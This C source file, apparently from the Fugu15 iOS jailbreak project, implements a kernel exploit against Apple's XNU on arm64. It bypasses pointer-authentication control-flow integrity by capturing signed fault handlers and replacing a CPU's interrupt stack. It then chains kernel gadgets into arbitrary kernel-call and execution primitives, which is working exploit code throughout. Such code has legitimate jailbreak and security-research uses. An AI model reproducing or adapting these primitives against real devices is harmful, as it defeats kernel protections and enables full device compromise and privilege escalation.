//
//  badRecovery.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "badRecovery.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <ptrauth.h>
#include <IOKit/IOKitLib.h>

#include "includeme.h"
#include "offsets.h"
#include "kernel.h"
#include "DriverKit.h"
#include "generated/device.h"
#include "physrw.h"
#include "virtrw.h"
#include "kernrw_alloc.h"

exploitThreadInfo fugu15ExploitThread;
Fugu14KcallThread fugu14KcallThread;
uint64_t stack[1024];

uint64_t mapKernelPage(uint64_t addr) {
    if (fugu15ExploitThread.inited || fugu14KcallThread.inited) {
        uint64_t page       = addr & ~0x3FFFULL;
        uint64_t off        = addr & 0x3FFFULL;
        uint64_t translated = translateAddr(page);
        
        vm_address_t ptr = 0;
        kern_return_t kr = vm_allocate(mach_task_self_, &ptr, 0x4000, VM_FLAGS_ANYWHERE);
        guard (kr == KERN_SUCCESS) else {
            puts("[-] mapKernelPage: Failed to allocate page!");
            return 0;
        }
        
        pmap_enter_options_addr(gOurPmap, translated, ptr);
        
        return ptr + off;
    } else {
        return physrw_map_once(addr);
    }
}

uint64_t ensureSpecialMem(uint64_t cur) {
    uint64_t mapped = cur;
    while (mapped == 0 || translateAddr(mapped + 0x4000ULL)) {
        mapped = kmemAlloc(0x4000, NULL, false);
    }
    
    return mapped;
}

uint64_t gUserReturnThreadContext = 0;
volatile uint64_t gUserReturnDidHappen = 0;

uint64_t getUserReturnThreadContext(void) {
    if (gUserReturnThreadContext != 0) {
        return gUserReturnThreadContext;
    }
    
    arm_thread_state64_t state;
    bzero(&state, sizeof(state));
    
    arm_thread_state64_set_pc_fptr(state, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        state.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    thread_t chThread = 0;
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, &chThread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] getUserReturnThreadContext: Failed to create return thread!");
        return 0;
    }
    
    thread_suspend(chThread);
    
    uint64_t returnThreadPtr = TASK_FIRST_THREAD(gOurTask);
    guard (returnThreadPtr != 0) else {
        puts("[-] getUserReturnThreadContext: Failed to find return thread!");
        return 0;
    }
    
    DBGPRINT_ADDRVAR(returnThreadPtr);
    
    uint64_t returnThreadACTContext = THREAD_ACT_CONTEXT(returnThreadPtr);
    guard (returnThreadACTContext != 0) else {
        puts("[-] getUserReturnThreadContext: Return thread has no ACT_CONTEXT?!");
        return 0;
    }
    
    gUserReturnThreadContext = returnThreadACTContext;
    
    return returnThreadACTContext;
}

/*
 * This function breaks Control Flow Integrity by obtaining
 * a signed thread fault handler address to an unprotected ret.
 *
 * Unprotected handlers can be found in xnu/osfmk/arm64/machine_routines_asm.s
 * See label 9 in both hw_lock_trylock_mask_allow_invalid and hw_lck_ticket_reserve_orig_allow_invalid
 *
 * (This implementation targets hw_lck_ticket_reserve_orig_allow_invalid)
 */
bool breakCFI(uint64_t kernelBase) {
    // Get this thread
    uint64_t thisThread = TASK_FIRST_THREAD(gOurTask);
    guard (thisThread != 0) else {
        puts("[-] breakCFI: Failed to find this thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(thisThread);
    
    // Create a new thread
    thread_t chThread = 0;
    bzero(&fugu15ExploitThread.gExploitThreadState, sizeof(fugu15ExploitThread.gExploitThreadState));
    
    uint64_t thStack = ((uint64_t) &stack[512]) & ~0xFULL;
    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_thread);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_constant((void*) 0x41424344, ptrauth_key_function_pointer, 0));
    
    fugu15ExploitThread.gExploitThreadState.__x[20] = (uint64_t) mach_host_self();
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT, &chThread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] breakCFI: Failed to create thread!");
        return false;
    }
    
    // Find it
    uint64_t chThreadPtr = TASK_FIRST_THREAD(gOurTask);
    if (chThreadPtr == thisThread) {
        DBGPRINT_ADDRVAR(chThreadPtr);
        chThreadPtr = THREAD_NEXT(thisThread);
        DBGPRINT_ADDRVAR(chThreadPtr);
    }
    
    guard (chThreadPtr != 0) else {
        puts("[-] breakCFI: Failed to find child thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(chThreadPtr);
    
    // Create another thread
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    arm_thread_state64_t other;
    memcpy(&other, &fugu15ExploitThread.gExploitThreadState, sizeof(other));
    
    uint64_t returnThreadACTContext = getUserReturnThreadContext();
    guard (returnThreadACTContext != 0) else {
        puts("[-] breakCFI: getUserReturnThreadContext failed!");
        return false;
    }
    
    fugu15ExploitThread.gReturnContext = returnThreadACTContext;
    
    // Map exploit thread
    uint64_t mapAddr = mapKernelPage(chThreadPtr);
    guard (mapAddr != 0) else {
        puts("[-] breakCFI: Failed to map thread!");
        return false;
    }
    
    uint64_t signedFaultHandler = 0;
    while ((signedFaultHandler | 0xFFFFFF8000000000ULL) != SLIDE(gOffsets.hw_lck_ticket_reserve_orig_allow_invalid_signed)) {
        signedFaultHandler = *(volatile uint64_t*)(mapAddr + THREAD_FAULT_HNDLR_OFFSET);
    }
    
    puts("[+] breakCFI: Obtained signed fault handler!!!");
    
    DBGPRINT_ADDRVAR(signedFaultHandler);
    
    // Capture some cpu_data struct
    uint64_t cpuData = 0;
    while (cpuData == 0) {
        cpuData = *(uint64_t*)(mapAddr + THREAD_CPUDATA_OFFSET);
    }
    
    fugu15ExploitThread.gCPUData = cpuData;
    
    // Allocate a new interrupt stack for that CPU
    uint64_t intStack = kmemAlloc(0x4000 * 4, NULL, false) + 0x8000ULL; // Four pages
    fugu15ExploitThread.gIntStack = intStack;
    
    fugu15ExploitThread.gOrigIntStack = kread64(cpuData + 0x10ULL);
    
    DBGPRINT_ADDRVAR(fugu15ExploitThread.gOrigIntStack);
    
    // Replacing the interrupt stack *should* be safe, unless:
    // 1. Something is running on the old interrupt stack AND
    // 2. That code causes a synchronous exception
    // (Which never happens)
    kwrite64(cpuData + 0x10ULL, intStack);
    kwrite64(cpuData + 0x18ULL, intStack);
    
    DBGPRINT_ADDRVAR(intStack);
    
    // Suspend and abort the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Our gadgets
    uint64_t brx22           = SLIDE(gOffsets.brX22); // Weird gadget, first signs x22, then jumps to it
    uint64_t signGadget      = SLIDE(gOffsets.hw_lck_ticket_reserve_orig_allow_invalid + 4ULL);
    uint64_t exceptionReturn = SLIDE(gOffsets.exceptionReturn);
    
    // Set new state
    // This state will be reflected in the kernel
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0x4142434400ULL | i;
    }
    
    uint64_t origACT = *(uint64_t*)(mapAddr + THREAD_ACT_CONTEXT_OFFSET);
    fugu15ExploitThread.gACTPtr = chThreadPtr + THREAD_ACT_CONTEXT_OFFSET;
    fugu15ExploitThread.gACTVal = origACT;
    
    fugu15ExploitThread.gExploitThreadState.__x[10] = origACT;  // ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[11] = mapAddr;
    fugu15ExploitThread.gExploitThreadState.__x[16] = chThreadPtr - THREAD_FAULT_HNDLR_OFFSET + THREAD_ACT_CONTEXT_OFFSET; // Restore ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[17] = brx22;
    
    fugu15ExploitThread.gSpecialMemRegion = ensureSpecialMem(fugu15ExploitThread.gSpecialMemRegion);
    
    fugu15ExploitThread.gExploitThreadState.__x[18] = fugu15ExploitThread.gSpecialMemRegion + 0x4000ULL - 0x140ULL;
    fugu15ExploitThread.gExploitThreadState.__x[19] = intStack + 0x3FF0ULL;
    fugu15ExploitThread.gExploitThreadState.__x[20] = cpuData;
    fugu15ExploitThread.gExploitThreadState.__x[21] = returnThreadACTContext;
    fugu15ExploitThread.gExploitThreadState.__x[22] = exceptionReturn;
    fugu15ExploitThread.gExploitThreadState.__x[23] = -1;
    fugu15ExploitThread.gExploitThreadState.__x[25] = THREAD_CPUDATA_OFFSET;
    fugu15ExploitThread.gExploitThreadState.__x[26] = THREAD_KSTACKPTR_OFFSET;
    fugu15ExploitThread.gExploitThreadState.__x[27] = THREAD_ACT_CONTEXT_OFFSET;
    
    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, 0x414243441DULL);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, 0x414243441EULL);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_doIt);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_unauthenticated((void*) signGadget, ptrauth_key_function_pointer, 0));
    
    // Set thread fault handler
    THREAD_FAULT_HNDLR_SET(chThreadPtr, signedFaultHandler);
    
    puts("GO!");
    
    // Set state and wait for boom!
    thread_set_state(chThread, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(chThread);
    
    uint64_t brx22Handler = 0;
    uint64_t datStack = 0;
    while ((brx22Handler | 0xFFFFFF8000000000ULL) != SLIDE(gOffsets.brX22)) {
        brx22Handler = *(volatile uint64_t*)(mapAddr + THREAD_FAULT_HNDLR_OFFSET);
        if (datStack == 0) {
            datStack = *(volatile uint64_t*)(mapAddr + THREAD_KSTACKPTR_OFFSET);
        }
    }
    
    puts("[+] breakCFI: Obtained signed br x22 fault handler!!!");
    DBGPRINT_ADDRVAR(datStack);
    
    // Stop the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Set new thread fault handler
    THREAD_FAULT_HNDLR_SET(chThreadPtr, brx22Handler);
    
    fugu15ExploitThread.gScratchMemKern = kmemAlloc(0x8000, (void**) &fugu15ExploitThread.gScratchMemMapped, false);
    fugu15ExploitThread.gExploitThread = chThread;
    fugu15ExploitThread.inited = true;
    
    return true;
}

void deinitFugu15PACBypass(void) {
    if (fugu15ExploitThread.inited) {
        fugu15ExploitThread.inited = false;
        
        kwrite64(fugu15ExploitThread.gCPUData + 0x10ULL, fugu15ExploitThread.gOrigIntStack);
        kwrite64(fugu15ExploitThread.gCPUData + 0x18ULL, fugu15ExploitThread.gOrigIntStack);
    }
}

/*
 * Execute the given CPU state.
 */
void kexec(kRegisterState *state, exploitThreadInfo *info) {
    uint64_t ldp_x0_x1       = SLIDE(gOffsets.ldp_x0_x1_x8_gadget);
    uint64_t exceptionReturnAfterCheck = SLIDE(gOffsets.exception_return_after_check);
    uint64_t exceptionReturnNoLR = SLIDE(gOffsets.exception_return_after_check_no_restore);
    uint64_t str_x8_x9 = SLIDE(gOffsets.str_x8_x9_gadget);
    
    uint64_t realStateKern    = info->gScratchMemKern + 0x10 + (sizeof(kRegisterState) * 2);
    kRegisterState *realState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + (sizeof(kRegisterState) * 2));
    memcpy(realState->x, state->x, sizeof(state->x));
    
    realState->sp = info->gIntStack + 0x3000 - 0x10;
    realState->fp = state->fp;
    
    uint64_t restoreACTStateKern    = info->gScratchMemKern + 0x10 + sizeof(kRegisterState);
    kRegisterState *restoreACTState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + sizeof(kRegisterState));
    restoreACTState->x[0]  = realStateKern;
    restoreACTState->x[1]  = state->pc;
    restoreACTState->x[2]  = state->cpsr;
    restoreACTState->x[3]  = state->lr;
    restoreACTState->x[8]  = info->gACTVal;
    restoreACTState->x[9]  = info->gACTPtr;
    restoreACTState->x[22] = 0;
    restoreACTState->x[23] = 0;
    restoreACTState->sp    = info->gScratchMemKern;
    
    kRegisterState *state1 = (kRegisterState*) &info->gScratchMemMapped[2];
    state1->x[0]  = restoreACTStateKern;
    state1->x[1]  = str_x8_x9;
    state1->x[2]  = CPSR_KERN_INTR_DIS;
    state1->x[3]  = exceptionReturnAfterCheck;
    state1->x[22] = 0;
    state1->x[23] = 0;
    state1->sp    = info->gScratchMemKern;
    
    info->gScratchMemMapped[0] = info->gScratchMemKern + 0x10;    // x0 -> Our first new context
    info->gScratchMemMapped[1] = exceptionReturnAfterCheck; // x1 -> PC
    
    // Now do an arbitrary kcall
    // Using the br x22 handler, first jump to our ldp x0, x1 gadget
    // Then return into the middle of exception_return, right after authenticating the thread state
    info->gExploitThreadState.__x[2]  = CPSR_KERN_INTR_DIS; // CPSR
    info->gExploitThreadState.__x[3]  = 0;                  // FPSR
    info->gExploitThreadState.__x[4]  = 0;                  // FPCR
    info->gExploitThreadState.__x[8]  = info->gScratchMemKern; // For the ldp x0, x1, [x8] gadget
    info->gExploitThreadState.__x[22] = ldp_x0_x1;
    arm_thread_state64_set_lr_fptr(info->gExploitThreadState, ptrauth_sign_unauthenticated((void*) exceptionReturnNoLR, ptrauth_key_function_pointer, 0));
    
    info->gSpecialMemRegion = ensureSpecialMem(info->gSpecialMemRegion);
    
    info->gExploitThreadState.__x[16] = state->x[16];
    info->gExploitThreadState.__x[17] = state->x[17];
    info->gExploitThreadState.__x[18] = info->gSpecialMemRegion + 0x4000ULL - 0x140ULL;
    
    thread_set_state(info->gExploitThread, ARM_THREAD_STATE64, (thread_state_t) &info->gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(info->gExploitThread);
}

uint64_t kcall_on_thread(exploitThreadInfo *info, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    uint64_t exceptionReturn    = SLIDE(gOffsets.exceptionReturn);
    uint64_t str_x0_x19_ldr_x20 = SLIDE(gOffsets.str_x0_x19_ldr_x20);
    
    kRegisterState kcallState;
    
    kcallState.x[0] = a1;
    kcallState.x[1] = a2;
    kcallState.x[2] = a3;
    kcallState.x[3] = a4;
    kcallState.x[4] = a5;
    kcallState.x[5] = a6;
    kcallState.x[6] = a7;
    kcallState.x[7] = a8;
    
    kcallState.x[19] = info->gScratchMemKern + 0x7FF8; // Where x0 should be stored
    kcallState.x[20] = 0x0;             // Invalid address
    kcallState.x[21] = info->gReturnContext;  // Userspace context
    kcallState.x[22] = exceptionReturn; // br x22 gadget
    kcallState.x[23] = -1;              // Required for br x22 gadget
    
    kcallState.pc = func;
    kcallState.lr = str_x0_x19_ldr_x20; // This will crash (intended) and then continue via br x22 fault handler
    kcallState.cpsr = CPSR_KERN_INTR_DIS;
    
    kexec(&kcallState, info);
    
    info->gScratchMemMapped[4095] = 0xDEADBEEFCAFEBABEULL;
    uint64_t set = 0xDEADBEEFCAFEBABEULL;
    uint64_t res = set;
    while (res == set) {
        res = info->gScratchMemMapped[4095];
    }
    
    // Stop the thread
    thread_suspend(info->gExploitThread);
    thread_abort(info->gExploitThread);
    
    return res;
}

// This function is a bit complicated but it essentially just creates a
// Fugu14-like kcall primitive
// It minimizes the number of times the Fugu15 kcall has to be used
// (Fugu15 kcall is a bit unstable)
bool setupFugu14Kcall(void) {
    // Create a Fugu14-like kcall primitive
    // First we need a new thread
    thread_t thread = 0;
    kern_return_t kr = thread_create(mach_task_self_, &thread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] setupFugu14Kcall: thread_create failed!");
        return false;
    }
    
    // Find the thread
    uint64_t threadPtr = TASK_FIRST_THREAD(gOurTask);
    guard (threadPtr != 0) else {
        puts("[-] setupFugu14Kcall: Failed to find thread!");
        return false;
    }
    
    // Get it's state pointer
    uint64_t actContext = THREAD_ACT_CONTEXT(threadPtr);
    guard (threadPtr != 0) else {
        puts("[-] setupFugu14Kcall: Failed to get thread ACT_CONTEXT!");
        return false;
    }
    
    // Create a stack
    void *stackMapped = NULL;
    uint64_t stack = kmemAlloc(0x4000 * 4, &stackMapped, false) + 0x8000ULL; // Four pages
    guard (stack != 0) else {
        puts("[-] setupFugu14Kcall: Failed to alloc kernel stack!");
        return false;
    }
    
    kRegisterState *mappedState = (kRegisterState*)((uintptr_t) stackMapped + 0x8000ULL);
    
    /*
     * We set our signed state like this:
     * pc  -> Gadget to set TH_KSTACKPTR of this thread
     *        Required in order to survive br x22 jumps via a fault (fault handler checks stack)
     * lr  -> Gadget to load a new CPU state
     * x17 -> Address of br x22 gadget
     *        We can't load x17 via the load CPU state gadget so we have to include it in the signed state
     *
     * Setup:
     * Set the thread fault handler to our br x22 gadget and immediatly use it to return
     *
     * Kcall:
     * A kcall can be done by jumping to the requested address and returning to a str x0, ...; ldr x??, ...; gadget, making sure the load faults
     * This will cause the br x22 gadget to be invoked -> Return to user
     */
    
    // Resign context
    uint64_t str_x8_x9_gadget = SLIDE(gOffsets.str_x8_x9_gadget);
    uint64_t exception_return_after_check = SLIDE(gOffsets.exception_return_after_check);
    uint64_t brX22 = SLIDE(gOffsets.brX22);
    kcall(SLIDE(gOffsets.ml_sign_thread_state), actContext, str_x8_x9_gadget /* pc */, CPSR_KERN_INTR_DIS /* cpsr */, exception_return_after_check /* lr */, 0 /* x16 */, brX22 /* x17 */, 0, 0);
    
    // Write register values
    kwrite64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
    kwrite32(actContext + offsetof(kRegisterState, cpsr),  CPSR_KERN_INTR_DIS);
    kwrite64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
    kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
    kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);
    
    // Use str x8, [x9] gadget to set TH_KSTACKPTR
    kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
    kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + THREAD_KSTACKPTR_OFFSET);
    
    // SP and x0 should both point to the new CPU state
    kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
    kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);
    
    // x2 -> new cpsr
    // Include in signed state since it is rarely changed
    kwrite64(actContext + offsetof(kRegisterState, x[2]), CPSR_KERN_INTR_EN);
    
    // Create a copy of this state
    kernread(actContext, sizeof(kRegisterState), &fugu14KcallThread.signedState);
    
    // Set a custom recovery handler
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid = SLIDE(gOffsets.hw_lck_ticket_reserve_orig_allow_invalid + 4ULL);
    
    // x1 -> new pc
    // x3 -> new lr
    kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
    // We don't need lr here
    
    // New state
    // Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
    mappedState->x[0] = 0;
    
    // Fault handler is br x22 -> set x22
    mappedState->x[22] = SLIDE(gOffsets.exceptionReturn);
    
    // Exception return expects a signed state in x21
    mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
    
    // Also need to set sp
    mappedState->sp = stack;
    
    // Reset flag
    gUserReturnDidHappen = 0;
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Run the thread
    thread_resume(thread);
    
    // Wait for flag to be set
    while (!gUserReturnDidHappen) ;
    
    // Stop thread
    thread_suspend(thread);
    thread_abort(thread);
    
    // Done!
    // Thread's fault handler is now set to the br x22 gadget
    fugu14KcallThread.thread              = thread;
    fugu14KcallThread.actContext          = actContext;
    fugu14KcallThread.kernelStack         = stack;
    fugu14KcallThread.mappedState         = mappedState;
    fugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
    fugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t) stackMapped + 0xF000ULL);
    fugu14KcallThread.inited              = true;
    
    return true;
}

uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    // Restore signed state first
    kernwrite(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
    
    // Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
    uint64_t str_x0_x19_ldr_x20 = SLIDE(gOffsets.str_x0_x19_ldr_x20);
    
    // x1 -> new pc
    // x3 -> new lr
    kwrite64(callThread->actContext + offsetof(kRegisterState, x[1]), func);
    kwrite64(callThread->actContext + offsetof(kRegisterState, x[3]), str_x0_x19_ldr_x20);
    
    // New state
    // x19 -> Where to store return value
    callThread->mappedState->x[19] = callThread->scratchMemory;
    
    // x20 -> NULL (to force data abort)
    callThread->mappedState->x[20] = 0;
    
    // x22 -> exceptionReturn
    callThread->mappedState->x[22] = SLIDE(gOffsets.exceptionReturn);
    
    // Exception return expects a signed state in x21
    callThread->mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
    
    // Also need to set sp
    callThread->mappedState->sp = callThread->kernelStack;
    
    // Set args
    callThread->mappedState->x[0] = a1;
    callThread->mappedState->x[1] = a2;
    callThread->mappedState->x[2] = a3;
    callThread->mappedState->x[3] = a4;
    callThread->mappedState->x[4] = a5;
    callThread->mappedState->x[5] = a6;
    callThread->mappedState->x[6] = a7;
    callThread->mappedState->x[7] = a8;
    
    // Reset flag
    gUserReturnDidHappen = 0;
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Run the thread
    thread_resume(callThread->thread);
    
    // Wait for flag to be set
    while (!gUserReturnDidHappen) ;
    
    // Stop thread
    thread_suspend(callThread->thread);
    thread_abort(callThread->thread);
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Copy return value
    return callThread->scratchMemoryMapped[0];
}

uint64_t Fugu14Kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
}

uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    if (fugu14KcallThread.inited) {
        return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
    }
    
    return kcall_on_thread(&fugu15ExploitThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
}

bool kexec_on_new_thread(kRegisterState *kState, thread_t *thread) {
    arm_thread_state64_t state;
    bzero(&state, sizeof(state));
    
    arm_thread_state64_set_pc_fptr(state, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        state.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, thread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] kexec_on_new_thread: Failed to create new thread!");
        return false;
    }
    
    thread_suspend(*thread);
    thread_abort(*thread);
    
    uint64_t threadPtr = TASK_FIRST_THREAD(gOurTask);
    guard (threadPtr != 0) else {
        puts("[-] kexec_on_new_thread: Failed to find new thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(threadPtr);
    
    kRegisterState *threadACTContext = (kRegisterState*) THREAD_ACT_CONTEXT(threadPtr);
    guard (threadACTContext != NULL) else {
        puts("[-] kexec_on_new_thread: New thread has no ACT_CONTEXT?!");
        return false;
    }
    
    // Write new state (only important stuff)
    size_t sizeToWrite = offsetof(kRegisterState, other[0]) - offsetof(kRegisterState, x[0]);
    kernwrite((uint64_t) &threadACTContext->x[0], &kState->x[0], sizeToWrite);
    
    // Resign it
    kcall(SLIDE(gOffsets.ml_sign_thread_state), (uint64_t) threadACTContext, kState->pc, kState->cpsr, kState->lr, kState->x[16], kState->x[17], 0, 0);
    
    // Resume
    thread_resume(*thread);
    
    return true;
}
